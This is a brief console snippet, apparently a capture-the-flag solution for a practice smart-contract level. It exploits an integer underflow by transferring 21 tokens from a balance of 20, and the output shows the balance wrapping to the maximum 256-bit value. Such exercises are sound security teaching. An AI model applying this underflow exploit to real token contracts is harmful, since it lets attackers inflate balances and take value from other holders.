await contract.balanceOf(player).then((res) => res.toString());
// '20'

await contract.transfer(contract.address, 21);
// the contract is not protected by underflow

await contract.balanceOf(player).then((res) => res.toString());
// '115792089237316195423570985008687907853269984665640564039457584007913129639935'
